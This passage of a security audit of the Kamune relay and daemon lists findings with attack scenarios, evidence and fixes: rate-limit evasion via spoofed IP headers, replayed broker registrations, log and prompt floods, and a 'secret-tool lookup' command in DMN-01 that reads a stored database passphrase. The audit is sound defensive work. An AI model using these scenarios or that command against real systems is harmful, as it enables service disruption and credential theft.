When the TCP peer is in trusted_proxies, clientIP returns the first parseable value among X-Real-Ip, True-Client-IP, CF-Connecting-IP, Fly-Client-IP and Fastly-Client-IP, and only then walks X-Forwarded-For. A given proxy sets one of these headers and passes the others through from the client. Cloudflare sets CF-Connecting-IP and X-Forwarded-For but does not set or strip X-Real-IP; a common nginx setup sets only X-Forwarded-For. The client's own X-Real-Ip is checked first and wins, and it becomes both the rate-limit key and the logged address. The relay README tells operators to "list only the proxy networks that overwrite forwarded headers", but no proxy overwrites all five.

**Attack scenario.** Relay behind Cloudflare, Cloudflare Tunnel or nginx, with the proxy address in trusted_proxies (the fix for the shared-bucket problem). The attacker sends each WS upgrade with a random `X-Real-Ip`, getting a fresh 20-per-minute quota every request: unlimited session creation, HPKE work and online PSK guesses, and the limiter LRU fills with junk keys. The attacker can also send 20 requests per minute with `X-Real-Ip: <victim IP>` so the victim's real connections, keyed by CF-Connecting-IP, get 429.

**Recommendation.** Make the client-IP header an explicit config value (for example `server.client_ip_header = "CF-Connecting-IP"` or `"X-Forwarded-For"`) and read only that header. For X-Forwarded-For take the right-most untrusted hop. Drop the fixed vendor list. Document the Cloudflare Tunnel setting.

<details><summary>Evidence</summary>

```text
router.go:71-86:
  if !ipInRanges(net.ParseIP(remoteIP), trustedProxies) { return remoteIP }
  for _, header := range []string{
      "X-Real-Ip",
      "True-Client-IP",
      "CF-Connecting-IP",
      "Fly-Client-IP",
      "Fastly-Client-IP",
  } {
      if ip := singleHeader(r, header); ip != "" {
          return ip
      }
  }
ws_handler.go:33-34: remoteAddr := clientIP(r, h.trustedProxies); ... rl.Allow(remoteAddr)
Sandbox probe: RemoteAddr 127.0.0.1 (trusted), CF-Connecting-IP 198.51.100.7, X-Forwarded-For "203.0.113.50, 198.51.100.7", X-Real-Ip 203.0.113.99 (client-supplied):
  [...]
```

</details>

#### REL-12

**Broker rebinds a held registration to any source that repeats the public key, redirecting the peer's hole-punch**

Severity: Low · Category: security

Locations: `cmd/relay/internal/broker/broker.go:237`, `cmd/relay/internal/broker/broker.go:239`

A REGISTER carrying the same token and X25519 public key as a held entry overwrites held.addr with the packet's source and refreshes the TTL. The broker never checks that the sender holds the private key. The public key is sent in clear in every REGISTER and is returned to any static-token squatter in NOTIFY. RELAY.md says a replayed REGISTER can 'disrupt legitimate registrations or refresh a held entry's TTL'. The code goes further: the replayer chooses where the matched peer is told to punch.

**Attack scenario.** An on-path observer captures Alice's REGISTER and replays it from its own host (or with a forged source). When Bob registers, Bob's NOTIFY lists the attacker's address as Alice's, so Bob sends KCP/hole-punch traffic, and his IP, to the attacker or to a third-party address of the attacker's choice. Kamune authentication still stops impersonation; the effect is DoS and address disclosure.

**Recommendation.** Only accept an address change when the REGISTER carries proof of the private key, for example a MAC over (token, src, timestamp) keyed by X25519(peer key, broker static key), or a cookie from a prior echo to the new source.

#### REL-13

**Relay Docker image runs the relay as root**

Severity: Low · Category: security

Locations: `cmd/relay/Dockerfile:35-42`, `cmd/relay/assets/config.toml:19-50`

The runtime stage of cmd/relay/Dockerfile has no USER directive, so the relay runs as UID 0 in the container. With the shipped config the relay listens on tcp 0.0.0.0:8889, tls 0.0.0.0:8890, wss 0.0.0.0:8891 and the UDP broker on 0.0.0.0:4788. All of these ports are above 1024, so it does not need root. ws (8888) and diagnose are disabled by default. This is a hardening gap: any future logic bug that gives code execution would run as container root.

**Attack scenario.** Any future memory-safety or logic bug in the relay, the HPKE/ML-KEM stack or the websocket library that gives code execution runs as container root. That makes container escape and changes to the mounted /etc/relay.toml (including the PSK) easier.

**Recommendation.** Add a non-root user in the runtime stage (`RUN adduser -D -H relay` and `USER relay`), make /etc/relay.toml read-only to that user, and document `--read-only` and `--cap-drop=ALL` for deployment.

#### REL-14

**WebSocket accept disables the Origin check for all requests**

Severity: Low · Category: security

Locations: `cmd/relay/internal/handlers/ws_handler.go:40-42`, `cmd/relay/internal/handlers/ws_handler.go:34`

websocket.Accept is called with InsecureSkipVerify: true (ws_handler.go:40-42), which disables the Origin check. A web page can therefore have visitors' browsers complete the WebSocket upgrade, HPKE and Register against any relay the browser can reach over plain ws or WSS with a trusted certificate. Register is not possible in PSK mode. The page can register listener sessions from many visitors' IPs and fill max_concurrent_sessions while staying under the per-IP limit. Consuming a visitor's rate-limit quota does not depend on this flag, because rl.Allow at ws_handler.go:34 runs before Accept for any GET to /ws.

**Attack scenario.** A malicious or compromised web page runs JS that opens ws://127.0.0.1:8888/ws, a LAN relay such as ws://192.168.1.10:8888/ws, or a public relay from each visitor's browser, runs HPKE, and registers listener tokens. Visitors who also use Kamune get 429, many visitors together fill max_concurrent_sessions from distributed residential IPs, and the page reaches open relays the operator thought were internal.

**Recommendation.** Remove InsecureSkipVerify, or reject requests that carry an Origin header unless it matches a configured `ws.allowed_origins` / OriginPatterns allow-list. Native clients send no Origin and are unaffected.

#### REL-15

**Broker spends X25519 work and sends larger replies to unverified UDP source addresses (reflection and CPU exhaustion)**

Severity: Low · Category: dos

Locations: `cmd/relay/internal/broker/broker.go:154-163`, `cmd/relay/internal/broker/broker.go:167-194`, `cmd/relay/internal/broker/broker.go:224-261`, `cmd/relay/internal/broker/broker.go:276-296`, `cmd/relay/internal/broker/broker.go:324-352`, `cmd/relay/internal/broker/broker.go:361-366` and 3 more

The broker does X25519 work for unverified UDP sources on one goroutine. Every NOTIFY (broker.go:327-339) costs an X25519 keygen, an ECDH, SHA-256 and an XChaCha20-Poly1305 seal, measured at about 116 us on this host, or about 8.6k NOTIFYs/s. allowRegister keys the limiter on the UDP source (broker.go:361-366), so spoofed random sources each get a fresh quota. The registry cap of 100k stops random-mode crypto once the registry is full. Static-token pairs bypass it: the first REGISTER inserts, the second matches, deletes the entry and sends two NOTIFYs (broker.go:256-260, 287-295). About 5-6 Mbps of spoofed 60-byte REGISTERs is enough to saturate the Run loop and starve legitimate ECHO and REGISTER traffic. RELAY.md:1021-1022 says the limiter stops attackers from burning asymmetric crypto, which does not hold for spoofed UDP. Reflection is minor. On the wire the gain is ECHO 34->50 bytes, REGISTER 88->127 bytes and a pair 176->322 bytes, and the default limiter caps replies at 20 per minute per victim IP per relay, unless rate_limit.disabled is set.

**Attack scenario.** An attacker sends spoofed STUN_ECHO and REGISTER packets with the victim's IP as the source to many public relays and uses them as small amplifiers. Separately, it sends REGISTER floods with random spoofed source addresses. Every packet passes the limiter and costs two X25519 operations on the one broker goroutine. The read loop falls behind, the socket buffer drops packets, and legitimate ECHO and REGISTER traffic stops working while backscatter NOTIFYs go to random hosts.

**Recommendation.** Add a stateless cookie: answer the first REGISTER from an unknown source with a small MAC-based challenge and do X25519 work only after the client echoes it. Keep the ECHO response no larger than the request, for example by padding requests to the response size. Add a global packets-per-second cap in addition to the per-IP limiter.

#### REL-16

**Rejected and malformed WS requests each emit a WARN/ERROR log line; one keep-alive socket can flood logs**

Severity: Low · Category: dos

Locations: `cmd/relay/internal/handlers/ws_handler.go:34-45`, `cmd/relay/internal/handlers/tcp_handler.go:46-48`, `cmd/relay/internal/handlers/ws_handler.go:126`, `cmd/relay/Dockerfile:42`

Every request rejected by the limiter logs WARN "rate limit exceeded" with the client IP, and every non-upgrade /ws request logs ERROR "ws: failed to accept". Because the HTTP connection stays open after a 429 (see the idle-timeout finding), a client can pipeline requests on one socket and produce one log line per request with no TCP or TLS handshake cost. The TCP loop logs WARN per rejected accept and ERROR per failed HPKE. Nothing samples or rate-limits these logs. The Docker image runs with the default json-file log driver, which does not rotate.

**Attack scenario.** An attacker keeps one TCP connection to the WS/WSS port and pipelines `GET /ws HTTP/1.1` requests in a loop. After 20 requests each one returns 429 and writes a WARN line with an IP. At tens of thousands of requests per second the relay's log volume fills the disk on hosts without log rotation.

**Recommendation.** Rate-limit or sample rejection logs (for example one line per key per window), log handshake failures at DEBUG, and close the HTTP connection on 429 (`w.Header().Set("Connection", "close")`).

#### REL-17

**WSS TLS handshakes (RSA-2048 signatures) run before the rate limiter, contrary to the rate-limit-before-crypto claim**

Severity: Low · Category: dos

Locations: `cmd/relay/run/run.go:153-168`, `cmd/relay/run/run.go:255`, `cmd/relay/internal/handlers/ws_handler.go:33-37`, `cmd/relay/internal/handlers/tcp_handler.go:22-50`, `docs/RELAY.md:289-290`, `docs/RELAY.md:305-308`

For the raw TLS listener the check happens at accept, before the lazy TLS handshake. For WSS, http.Server completes the TLS handshake (server-side RSA-2048 signature with the generated key) and reads the HTTP request before WebSocketHandler calls Allow. Over-quota and non-/ws clients therefore still make the relay do an asymmetric signature per connection. RELAY.md says rate limiting runs before any asymmetric work.

**Attack scenario.** An attacker opens TLS connections to the WSS port at a high rate and aborts after ServerHello. Each costs the relay one RSA-2048 signature while the attacker does one ECDHE. Over-quota IPs are never refused before this work.

**Recommendation.** Wrap the WSS listener with a per-IP check at accept (custom net.Listener that calls Allow before returning the conn), or use an ECDSA P-256 key for generated certs to cut signing cost. Correct RELAY.md:305-308 for WSS.

#### REL-18

**Join can pair a dialer with a dead listener between ClosePeerChannel and Unregister, orphaning the dialer**

Severity: Low · Category: concurrency

Locations: `cmd/relay/internal/handlers/ws_handler.go:110`, `cmd/relay/internal/handlers/ws_handler.go:111`, `cmd/relay/internal/services/session.go:131`, `cmd/relay/internal/services/session.go:195`

When a listener's connection ends, the handler defer calls hub.ClosePeerChannel and then hub.Unregister as two separate locked operations. A Join that runs between them finds the session with dialer == nil and pairs. Unregister then deletes the session because the listener is still its owner. The dialer received Registered, its frames now hit ErrTokenNotFound in Recipient and are dropped, and no code closes it: it is outside the session map, so neither session_ttl nor purge applies. It stays until the client gives up.

**Attack scenario.** A listener's network drops just as the dialer joins. The dialer's client sees a successful join and waits for a kamune handshake that never comes. The relay keeps the dialer connection and goroutine with no session accounting.

**Recommendation.** Do close-and-remove in one SessionManager method that removes the entry under the lock and returns the peer channel to close, and have ReadPump's defer use it as well.

#### REL-19

**Config decoding silently ignores unknown keys, including the keys RELAY.md documents**

Severity: Low · Category: input-validation

Locations: `cmd/relay/internal/config/config.go:223-236`, `cmd/relay/internal/services/services.go:20-80`, `cmd/relay/internal/handlers/ws_handler.go:130-148`, `docs/RELAY.md:877-916`

config.New uses toml.Unmarshal and ignores MetaData.Undecoded, so misspelled or misplaced keys are dropped silently, and nothing logs whether PSK mode is on. A typo in `password`, or a password key in the wrong table, starts the relay in open mode. RELAY.md's documented keys (`[server] address`, `expose_health`, `expose_ip`, `[rate_limit] enabled`) are also ignored. Copied verbatim, that block fails Validate with 'ws.address must not be empty'. PSK clients fail against an open relay because it closes on an unexpected Auth frame, which limits how long the misconfiguration goes unnoticed.

**Attack scenario.** An operator writes `[server]\npasword = "s3cret"` or copies RELAY.md's `expose_ip = false`. The relay starts in open mode (needAuth false) and logs nothing about it. Anyone can create sessions on what the operator believes is a private relay.

**Recommendation.** Use toml.NewDecoder(...).Decode and fail when md.Undecoded() is non-empty, or at least log each undecoded key. Log at startup whether PSK mode is on.

#### REL-20

**max_message_size has no bounds; small values break all HPKE handshakes and values at or above 65536 let WS frames kill cross-transport sessions**

Severity: Low · Category: input-validation

Locations: `cmd/relay/internal/config/config.go:120-125`, `cmd/relay/internal/handlers/ws_handler.go:48-53`, `cmd/relay/internal/handlers/tcp_adapter.go:17`, `pkg/relayconn/framing.go:52-57`, `cmd/relay/internal/services/hub.go:122-130`, `pkg/exchange/channel.go:167-171`

session.max_message_size accepts any value >= 0. A value below 1216 breaks every relay HPKE handshake with no startup error, because exchange.Accept first reads the 1216-byte KEM public key. On WS, values of 65536 or more let a session participant send a frame that the relay cannot re-encrypt for a TCP/TLS peer: the +16-byte HPKE tag pushes it past framing's 65535 cap and hub.go:122-130 closes both channels. The impact is limited to the sender's own session. A value of 0, documented as 'no limit', means 65535 on both WS and TCP.

**Attack scenario.** Operator sets max_message_size = 1024: every client fails at HPKE and the relay looks up but serves nothing. Separately, with the default config or a raised value such as 256 KiB, a WS peer in a cross-transport session sends a 65,500-byte or 100 KB frame; forwarding to the TLS peer fails with 'frame size exceeds maximum' and the relay tears the session down.

**Recommendation.** Validate max_message_size in a range such as [4096, 65535] (or 0) and apply the same effective limit on WS and TCP. Account for the relay's re-wrap overhead when forwarding. Document 0 as 'transport maximum (65535)'.

#### REL-21

**handshake_timeout = 0 disables the handshake deadline entirely; RELAY.md says 0 means the 30s default**

Severity: Low · Category: spec-drift

Locations: `cmd/relay/internal/config/config.go:166-171`, `cmd/relay/internal/handlers/tcp_handler.go:52-54`, `cmd/relay/internal/handlers/ws_handler.go:65-74`, `docs/RELAY.md:907`, `docs/RELAY.md:924`

Validate accepts 0 with the message "0 = no limit". The TCP/TLS accept loop sets a deadline only when timeout > 0, and the WS handler arms its timer only when timeout > 0. config.New sets 30s only when the key is absent. RELAY.md documents 0 as "treated as default (30s)". The handshake timeout is the only control on pre-registration connections (there is no connection cap), so an operator who writes `handshake_timeout = "0s"` following the docs disables the documented "Handshake stalls" defense.

**Attack scenario.** Relay configured with handshake_timeout = "0s". An attacker opens TCP or WS connections and sends nothing, or sends the HPKE public key and stalls, and never sends Register. Each connection holds a goroutine and socket forever. At the default quota of 20 per minute per IP one IPv4 address accumulates 28,800 stuck sockets per day, and IPv6 rotation removes the per-IP bound.

**Recommendation.** Either treat 0 as the 30s default in config.New/Validate, as documented (use a negative value for unlimited), or update RELAY.md:907 and :924 to say '0 = no limit' and warn at startup when the handshake timeout is disabled.

#### REL-22

**Relay blocks the sender for up to 15 s per frame and then kills the session, contrary to the documented drop policy**

Severity: Low · Category: spec-drift

Locations: `cmd/relay/internal/services/hub.go:98`, `cmd/relay/internal/services/hub.go:122`, `cmd/relay/internal/services/hub.go:128`, `docs/RELAY.md:228`

RELAY.md says the relay applies no back-pressure and silently drops a message when the recipient is slow. handleMessage instead writes synchronously from the sender's read pump with a 15s deadline. A slow recipient stalls everything the sender sends, including its pings, and TCP back-pressure reaches the sender. If one write takes over 15s, both peers are closed, so a slow reader tears down the session rather than losing one message.

**Attack scenario.** A peer on a congested mobile link reads slowly for 15s. The relay stops reading from the other peer for that time, then closes both connections. The other peer sees a disconnect, not message loss.

**Recommendation.** Either document the actual behaviour (blocking forward with a 15s write timeout, then teardown) or add a small bounded per-recipient queue that drops on overflow, as the docs describe.

#### REL-23

**Shipped config and Docker image enable the UDP broker and plaintext TCP on 0.0.0.0; RELAY.md says broker is off by default**

Severity: Low · Category: spec-drift

Locations: `cmd/relay/assets/config.toml:29-31`, `cmd/relay/assets/config.toml:48-50`, `cmd/relay/Dockerfile:35-42`, `docs/RELAY.md:900-901`, `docs/RELAY.md:1043-1047`, `cmd/relay/README.md:25-27` and 1 more

assets/config.toml enables [tcp] on 0.0.0.0:8889 (lines 29-31) and [broker] on 0.0.0.0:4788 (lines 48-50). The Dockerfile copies this file to /etc/relay.toml as the default and its runtime stage (lines 35-42) has no USER, so the relay runs as root. RELAY.md's config reference shows the broker off on 127.0.0.1 and advises leaving it disabled in hostile networks. cmd/relay/README.md says the broker is on by default, so the two docs disagree. The broker uses the same rate limiter as TCP/WS (run.go:66-68), keyed by source IP string, so spoofed UDP packets with a victim's source IP consume that victim's relay quota.

**Attack scenario.** An operator runs `docker run kamune-relay` following the Dockerfile comment. The broker is reachable on UDP 4788 from the internet. Spoofed REGISTER/ECHO traffic can drain victims' relay quota (see the shared-limiter finding) and the operator did not choose to expose UDP.

**Recommendation.** Ship config.toml with the broker disabled (or bound to 127.0.0.1) to match RELAY.md, and add `USER nobody` (or a dedicated uid) to the runtime stage of the Dockerfile.

#### REL-24

**Release build script ignores per-platform build failures and appends to stale zip archives**

Severity: Info · Category: build

Locations: `cmd/relay/scripts/build.sh:35-36`, `cmd/relay/scripts/build.sh:49-54`, `cmd/relay/scripts/build.sh:56-66`, `cmd/relay/scripts/build.sh:70`, `Makefile:40`

build.sh logs FAILED and continues when go build fails for a platform. It still prints "Build complete!" and exits 0, so `make relay` (Makefile:40) also succeeds. If dist/relay holds a zip from an earlier build with the same VERSION, that older archive stays in place and looks current. zip -q without -FS updates the archive in place. Same-named entries (binary, config.toml, README.md, LICENSE) are replaced, so stale entries remain only if the staged file set changes. When zip is not installed (HAS_ZIP=false), the script leaves the bare binary with no config or license and prints no warning.

**Recommendation.** Track failures and exit non-zero at the end. Remove the target zip before zipping, or use `zip -FS`. Warn or fail when zip is missing.

#### REL-25

**Dead code: EchoIPHandler (/ip) is never routed and exported ParseForwardedIP trusts the leftmost public XFF entry**

Severity: Info · Category: docs

Locations: `cmd/relay/internal/handlers/handlers.go:36-40`, `cmd/relay/internal/handlers/router.go:122-142`, `docs/RELAY.md:933-952`

EchoIPHandler exists but run.go registers only /health (diagnose) and /ws, so the /ip endpoint and `expose_ip` described in RELAY.md do not exist. ParseForwardedIP is exported, unused outside tests, and returns the first non-private X-Forwarded-For entry, which a client controls. If it is wired in later it would allow spoofing.

**Recommendation.** Delete ParseForwardedIP and its tests, either delete EchoIPHandler or route it behind diagnose, and update RELAY.md's Diagnostics Endpoints section.

### daemon

cmd/daemon: the JSON-over-stdio daemon.

| ID                | Severity | Category         | Finding                                                                                                                                  |
| ----------------- | -------- | ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| [DMN-01](#dmn-01) | Medium   | privacy          | Daemon writes the DB passphrase to the OS keychain on every open without opt-in and never reads it back                                  |
| [DMN-02](#dmn-02) | Medium   | dos              | Live sessions keep every message, and the full stored history, in memory without bound only to compute msg_count                         |
| [DMN-03](#dmn-03) | Medium   | dos              | No cap or dedupe on pending verifications; unauthenticated peers can flood verify_peer prompts, each holding resources for 2 minutes     |
| [DMN-04](#dmn-04) | Medium   | dos              | Relay token commands run unbounded relay I/O on the command loop; a stalled relay freezes all commands                                   |
| [DMN-05](#dmn-05) | Medium   | correctness      | Incognito dial sessions panic on reconnect (nil storage passed to NewDialer) and stay as zombie live sessions                            |
| [DMN-06](#dmn-06) | Medium   | correctness      | Relay reconnect loop exits for good when the startup token expires, is rejected, or loses its relay link; server keeps reporting running |
| [DMN-07](#dmn-07) | Medium   | correctness      | Removing a P2P token does not stop the listener from re-registering it on the broker                                                     |
| [DMN-08](#dmn-08) | Medium   | concurrency      | send_message spawns one goroutine per command, so messages go out and are stored in random order                                         |
| [DMN-09](#dmn-09) | Medium   | spec-drift       | Relay reconnect token pool is never consumed or expired; listener re-registers token[0] forever, even after close                        |
| [DMN-10](#dmn-10) | Low      | security         | Relay address without a scheme defaults to plaintext ws; PSK and token rely only on unauthenticated HPKE                                 |
| [DMN-11](#dmn-11) | Low      | privacy          | Full relay and P2P tokens are logged; export_logs writes them with umask-default permissions and without escaping peer names             |
| [DMN-12](#dmn-12) | Low      | privacy          | One process-lifetime X25519 broker key is reused for every REGISTER, so random P2P tokens are linkable                                   |
| [DMN-13](#dmn-13) | Low      | dos              | History paging decrypts the whole session on every page; SessionTimestamps count is a full page walk                                     |
| [DMN-14](#dmn-14) | Low      | dos              | P2P dial waits for a broker match with no timeout and cannot be cancelled; empty or wrong p2p_token hangs forever and keeps storage busy |
| [DMN-15](#dmn-15) | Low      | dos              | Relay dial path has no timeout, so a stalling relay hangs daemon dials forever                                                           |
| [DMN-16](#dmn-16) | Low      | dos              | stdin line limit is checked after the whole line is buffered                                                                             |
| [DMN-17](#dmn-17) | Low      | correctness      | AddChatEntry errors are ignored; messages are dropped silently when the chat bucket is missing                                           |
| [DMN-18](#dmn-18) | Low      | correctness      | generate_p2p_token without a p2p listener registers from a throwaway UDP socket, so matches point to a dead port                         |
| [DMN-19](#dmn-19) | Low      | correctness      | get_share_info reports the requested bind address (for example 0.0.0.0:0), not the bound one                                             |
| [DMN-20](#dmn-20) | Low      | correctness      | HolePunch cancels its NAT-kick burst on return; 0 or 1 kick packets are sent and the timeout is ignored                                  |
| [DMN-21](#dmn-21) | Low      | correctness      | P2P listener never processes PEER_MATCHED; it never punches toward the dialer and the NOTIFY becomes a phantom KCP session               |
| [DMN-22](#dmn-22) | Low      | correctness      | P2P token refresh loop: expiry timer fires before the first refresh, so tokens vanish after 30 s                                         |
| [DMN-23](#dmn-23) | Low      | correctness      | Re-opening an already open storage path (open_storage or submit_passphrase) always fails after the 5 s bolt lock timeout                 |
| [DMN-24](#dmn-24) | Low      | correctness      | set_log_level filters only stderr; the log buffer, log_entry events and export_logs always include DEBUG entries                         |
| [DMN-25](#dmn-25) | Low      | correctness      | set_verification_mode restarts the server and closes every live session, including outgoing dials                                        |
| [DMN-26](#dmn-26) | Low      | correctness      | Settings from a previously opened DB (verification mode, incognito, log level) carry over to a newly opened DB                           |
| [DMN-27](#dmn-27) | Low      | correctness      | SIGTERM shuts resources down but the process does not exit until stdin delivers data                                                     |
| [DMN-28](#dmn-28) | Low      | correctness      | stop_server, restart_server and set_verification_mode end sessions without emitting session_closed                                       |
| [DMN-29](#dmn-29) | Low      | concurrency      | Dial that completes during shutdown registers a session after the snapshot, and wg.Wait then blocks shutdown indefinitely                |
| [DMN-30](#dmn-30) | Low      | concurrency      | relayReconnectLoop never updates currentTracker and writes tokenTracker.sessionID without the daemon lock                                |
| [DMN-31](#dmn-31) | Low      | resource-leak    | Dial-side transport is never closed after peer disconnect or a receive error                                                             |
| [DMN-32](#dmn-32) | Low      | resource-leak    | Relay token list grows without bound; expired tokens are never removed                                                                   |
| [DMN-33](#dmn-33) | Low      | input-validation | generate_relay_token ignores bad params and an invalid peer_pub_b64, silently issuing a random token                                     |
| [DMN-34](#dmn-34) | Low      | input-validation | submit_passphrase accepts an empty passphrase and silently creates or opens a DB with no passphrase protection                           |
| [DMN-35](#dmn-35) | Low      | input-validation | Unknown transport values silently fall back to TCP and may bind all interfaces                                                           |
| [DMN-36](#dmn-36) | Low      | ux-safety        | Auto-Accept stores every unverified peer as known, so Quick mode later trusts them without a prompt                                      |
| [DMN-37](#dmn-37) | Info     | correctness      | Dead code: deriveAndStoreRelayTokensForPeers would put a public-key token into the ECDH reconnect pool                                   |
| [DMN-38](#dmn-38) | Info     | test-gap         | No tests cover verifier flow, incognito, history pagination, export_logs or keychain behaviour                                           |
| [DMN-39](#dmn-39) | Info     | test-gap         | staticcheck reports dead code that hides missing behaviour (broker re-registration, static relay tokens)                                 |

Findings filed elsewhere that also apply here: [KAM-04](#kam-04), [KAM-07](#kam-07), [KAM-08](#kam-08), [STO-02](#sto-02), [RC-04](#rc-04), [RC-07](#rc-07), [BUS-01](#bus-01).

#### DMN-01

**Daemon writes the DB passphrase to the OS keychain on every open without opt-in and never reads it back**

Severity: Medium · Category: privacy

Locations: `cmd/daemon/daemon.go:337-367`, `cmd/daemon/daemon.go:356`, `cmd/daemon/daemon.go:609-628`, `cmd/daemon/daemon.go:44-67`, `cmd/daemon/daemon.go:996`, `cmd/bus/app.go:371` and 8 more

openStorage reads KAMUNE_DB_PASSPHRASE and, after every successful open, calls keyring.Set with it (daemon.go:354-366). handleSubmitPassphrase does the same with the submitted passphrase (daemon.go:624). No parameter opts out. keychainGet is called only by has_keychain_passphrase (daemon.go:996), so open_storage never uses the stored copy. The bus uses the same service "kamune" and account "db-passphrase:&lt;path&gt;", auto-unlocks from it at startup (cmd/bus/app.go:371), and itself saves only when the user ticks saveToKeychain (app.go:1013). The Passphrase Sources table (DAEMON.md:1867-1874) does not mention the write, DAEMON.md:1369 says the daemon 'can save and retrieve' it, and SPEC 11.2 (SPEC.md:1269) says 'The passphrase itself is never stored.' keychainDelete also deletes the legacy account named only by filepath.Base(dbPath) (daemon.go:44-48, 59-67), so clearing one DB's entry can delete another DB's entry with the same base name.

**Attack scenario.** An operator runs the daemon headless with KAMUNE_DB_PASSPHRASE from a secret manager and expects nothing to persist. After one open_storage, the login keyring holds service="kamune", account="db-passphrase:&lt;path&gt;". On Linux Secret Service any process in the user's D-Bus session can read the unlocked collection without a prompt (A7), for example `secret-tool lookup service kamune account db-passphrase:/home/u/.config/kamune/db`, including after the daemon exits. The bus GUI on the same account now opens the DB without asking, and a user who declined 'save to keychain' in bus gets it saved after one daemon open of the same path.

**Recommendation.** Add a save_to_keychain boolean to open_storage and submit_passphrase, default false, and call keyring.Set only when it is true. Never persist a passphrase that came from the environment or an empty passphrase. Either implement keychain retrieval in open_storage or drop the write and the 'retrieve' claim. Remove the basename-only legacy fallback or restrict it to a one-time migration. Document the behaviour in Passphrase Sources and change SPEC 11.2 to say the passphrase may be cached in the OS keychain when the user opts in.

<details><summary>Evidence</summary>

```text
daemon.go:354-360:
  if !params.DBNoPassphrase {
      if p, ok := d.passphrase.Load().([]byte); ok && len(p) > 0 {
          if err := keyring.Set(keychainService, keychainAccount(params.StoragePath), string(p),
daemon.go:624-625: if err := keyring.Set(keychainService, keychainAccount(dbPath), params.Passphrase,
grep keychainGet cmd/daemon: definition at daemon.go:51, only call at daemon.go:996 (has_keychain_passphrase)
cmd/bus/app.go:371: passphrase, err := keyring.Get(keychainService, keychainAccount(a.dbPath))
SPEC.md:1269: 'The passphrase itself is never stored.'
```

</details>

#### DMN-02

**Live sessions keep every message, and the full stored history, in memory without bound only to compute msg_count**

Severity: Medium · Category: dos

Locations: `cmd/daemon/messaging.go:24-29`, `cmd/daemon/messaging.go:131-138`, `cmd/daemon/messaging.go:210-218`, `cmd/daemon/messaging.go:288-296`, `cmd/daemon/network.go:740`, `cmd/daemon/network.go:812` and 4 more

appendMessage appends each sent and received message to liveSession.Messages as both Text and DataBase64 (messaging.go:24-29, 210-218, 288-296), about 2.3 times the payload size. loadChatHistory also loads and decrypts the whole stored history into the same slice at each session start and resume (network.go:1514-1533). The slice is never trimmed, and its only reader is MsgCount = len(s.Messages) (network.go:1575). A peer controls the inbound rate and size, up to about 60 KiB per message. In incognito the plaintext still accumulates in memory, and skipping the DB write removes the fsync throttle. The bus keeps a similar unbounded slice (cmd/bus/messaging.go:142-143).

**Attack scenario.** A malicious authenticated peer (A4) streams maximum-size messages on a long-lived session. The daemon heap grows by about 140 KiB per message, tens of MB per second on a LAN, until the OS kills it, which ends every other session. A session with a large stored history also costs its full decrypted size at every reconnect.

**Recommendation.** In the daemon, replace Messages with a counter (optionally a small bounded ring) and use SessionTimestamps or KeyCount for the initial count. In the bus, cap the in-memory window and page older messages from storage. Add a per-session receive rate limit.

<details><summary>Evidence</summary>

```text
messaging.go:24-29: func (s *liveSession) appendMessage(msg MessageInfo) { s.mu.Lock(); s.Messages = append(s.Messages, msg)
messaging.go:211-216: msg := MessageInfo{ Text: msgText, DataBase64: base64.StdEncoding.EncodeToString(b.GetValue()), ...
network.go:1514: entries, err := store.GetChatHistory(session.ID)
network.go:1575: MsgCount: len(s.Messages),
grep '.Messages' cmd/daemon (non-test): only messaging.go:26, network.go:1521,1523,1575
```

</details>

#### DMN-03

**No cap or dedupe on pending verifications; unauthenticated peers can flood verify_peer prompts, each holding resources for 2 minutes**

Severity: Medium · Category: dos

Locations: `cmd/daemon/verifier.go:13`, `cmd/daemon/verifier.go:93-148`, `cmd/daemon/verifier.go:167-191`, `cmd/daemon/daemon.go:179`, `server.go:94-108`, `server.go:131-144` and 2 more

Default Quick mode (daemon.go:179) and Strict mode create a new pending verification for every connection with an unknown key. They allocate a reqID, add a map entry, set the global status to verifying, and emit verify_peer with the remote-chosen name. Then they block for up to 2 minutes. There is no cap and no dedupe by key. The core accept loop starts one goroutine per conn with no limit, and serve() closes the conn only after the verifier returns. Each attempt therefore holds a goroutine and an fd for up to 120 s, past the 30 s deadline. An unauthenticated client can flood the app with spoofed-name prompts and flip the daemon status between verifying and error (verifier.go:181). Because Go raises the soft NOFILE limit to the hard limit, fd exhaustion needs a much higher rate than 1024 per 120 s on default Linux systems.

**Attack scenario.** An unauthenticated client (A5) that reaches the server port, or holds a relay or P2P token, completes HPKE and sends a self-signed Introduce named 'Alice' in a loop, with the same or throwaway keys. The client app gets a stream of verify_peer prompts claiming to be Alice, which buries the real peer's prompt and invites a mistaken accept. The daemon status flaps between verifying and error during real sessions, and at about 9 connections per second file descriptors run out (1024 per 120 s). Sandbox: daemon B sent 40 dial commands to daemon A (Quick mode); A emitted 40 verify_peer events with 40 distinct request_ids within 10 s for one key.

**Recommendation.** Keep at most one pending verification per remote public key, cap total pending verifications (for example 8) and reject beyond the cap without prompting, and drop a pending request when its connection fails or its handshake deadline expires (pass a context or deadline into the verifier). Do not overwrite the global status from per-connection verifiers. Add per-IP accept rate limiting in the core server.

<details><summary>Evidence</summary>

```text
daemon.go:180: verifMode: VerificationModeQuick,
verifier.go:109-118: reqID := d.verifIDCounter.Add(1) ... d.verifRequests[reqID] = &pendingVerification{ result: result, peerID: peer.Name, hex: hexFP }
verifier.go:123: d.emit(EvtVerifyPeer, "", MapA{ "request_id": reqID, "peer_name": peer.Name, ...
verifier.go:181: d.setStatus(StatusError, "Verification timed out")
server.go:205: if err := s.handshakeOpts.remoteVerifier(s.storage, peer); err != nil {
Sandbox: verify_peer events in A from one remote key in 10s: 40, distinct ids: 40
```

</details>

#### DMN-04

**Relay token commands run unbounded relay I/O on the command loop; a stalled relay freezes all commands**

Severity: Medium · Category: dos

Locations: `cmd/daemon/daemon.go:404`, `cmd/daemon/daemon.go:433`, `cmd/daemon/network.go:1308`, `cmd/daemon/network.go:1437`, `pkg/relayconn/listener.go:99`, `pkg/relayconn/listener.go:107`

Run processes commands one at a time (daemon.go:404-433). handleGenerateRelayToken (network.go:1308) and the relay branch of handleGetShareInfo (network.go:1437) call listenRelayTracked synchronously on that loop with d.ctx, which has no deadline. listenHandshake (pkg/relayconn/listener.go:107-160) performs the HPKE exchange, Register write and Registered read without a deadline, and ListenRelayTLS uses tls.DialWithDialer with a zero-timeout dialer that ignores ctx (listener.go:99). While the relay does not answer, the daemon reads no further stdin lines: verify_response, close_session and shutdown all wait, and pending verifications time out and are rejected.

